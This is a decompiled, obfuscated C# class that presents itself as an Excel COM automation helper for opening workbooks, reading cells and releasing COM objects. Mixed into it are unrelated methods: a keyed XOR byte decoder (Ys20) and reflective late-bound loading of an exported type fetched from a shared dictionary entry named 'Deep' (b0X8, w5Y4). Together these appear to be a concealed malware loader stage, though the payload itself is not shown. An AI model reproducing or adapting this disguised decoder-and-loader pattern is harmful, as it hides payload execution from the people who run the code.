using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using Af7;
using Fe51;
using Microsoft.VisualBasic.CompilerServices;
using d8LE;
using m0GL;
using m5TS;

namespace Sr8n;

public class Sa2y
{
	private c0RM _oXls;

	private Xe34 _oWBook;

	private Xd85 _oSheet;

	public c0RM OXls
	{
		get
		{
			return _oXls;
		}
		set
		{
			_oXls = value;
		}
	}

	public Xe34 OWBook
	{
		get
		{
			return _oWBook;
		}
		set
		{
			_oWBook = value;
		}
	}

	public Xd85 OSheet
	{
		get
		{
			return _oSheet;
		}
		set
		{
			_oSheet = value;
		}
	}

	public Sa2y()
	{
		_oXls = (c0RM)Activator.CreateInstance(Marshal.GetTypeFromCLSID(new Guid("00024500-0000-0000-C000-000000000046")));
	}

	public void Gk26(string w2S1, bool Xb20)
	{
		OWBook = OXls.Workbooks.Open(w2S1, RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing));
		OXls.Visible = Xb20;
	}

	internal static bool b0X8()
	{
		try
		{
			try
			{
				Type type = (Type)w5Y4(RuntimeHelpers.GetObjectValue(d5Q.mDic["Deep"]));
				if (Operators.CompareString(type.Name, d5Q.mDic[d5Q.tName].ToString(), false) == 0)
				{
					d5Q.mDic.Add(d5Q.T, type);
					return true;
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			ProjectData.ClearProjectError();
		}
		return false;
	}

	public void o6C9(string e9G8)
	{
		OSheet = (Xd85)OWBook.Sheets[e9G8];
	}

	public r4J2 Cf3s(int e2Q3, int Ja6g)
	{
		return (r4J2)OSheet.Cells[e2Q3, Ja6g];
	}

	public void Hs21(bool Sn9x)
	{
		if (OWBook != null)
		{
			OWBook.Close(Sn9x, RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing));
		}
		OXls.Quit();
		c0RM w0QR = OXls;
		z2ST(ref w0QR);
		OXls = w0QR;
	}

	internal static byte Ys20(byte Gq8f, byte[] Bk67, int Bt58, int m4J8)
	{
		Gq8f = (byte)(Gq8f ^ checked((byte)(Bk67[unchecked(m4J8 % Bk67.Length)] ^ ((m4J8 + unchecked(Bt58 % Bk67.Length)) & Bt58))));
		return Gq8f;
	}

	private static void z2ST<Ya4o>(ref Ya4o w0QR, bool y7F5 = false) where Ya4o : class
	{
		if (w0QR == null)
		{
			return;
		}
		try
		{
			if (Marshal.IsComObject(w0QR))
			{
				if (y7F5)
				{
					Marshal.FinalReleaseComObject(w0QR);
				}
				else
				{
					Marshal.ReleaseComObject(w0QR);
				}
			}
		}
		finally
		{
			w0QR = null;
		}
	}

	internal static object w5Y4(object Hc18)
	{
		return NewLateBinding.LateIndexGet(NewLateBinding.LateGet(Hc18, (Type)null, "GetExportedTypes", new object[0], (string[])null, (Type[])null, (bool[])null), new object[1] { 27 }, (string[])null);
	}
}
